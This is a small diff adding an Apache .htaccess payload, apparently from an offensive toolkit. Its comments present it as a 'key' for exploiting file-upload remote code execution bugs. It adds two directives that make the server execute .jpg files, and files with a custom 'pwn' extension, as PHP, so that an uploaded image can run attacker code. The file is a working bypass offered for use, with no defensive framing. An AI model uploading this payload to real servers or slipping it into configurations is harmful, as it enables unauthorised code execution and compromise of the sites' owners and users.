@@ -1,0 +1,9 @@
+# This file does not contain a shell; it is a "key" for changing server rules (it works on Apache) 
+# we need using this with File Upload RCE Bug type  ( The section follows the RCE Bug )
+# Bypass: Tell the server to execute JPG files as PHP
+
+AddType application/x-httpd-php .jpg
+
+# Or execute any file with 'pwn' extension as php
+
+AddHandler application/x-httpd-php .pwn
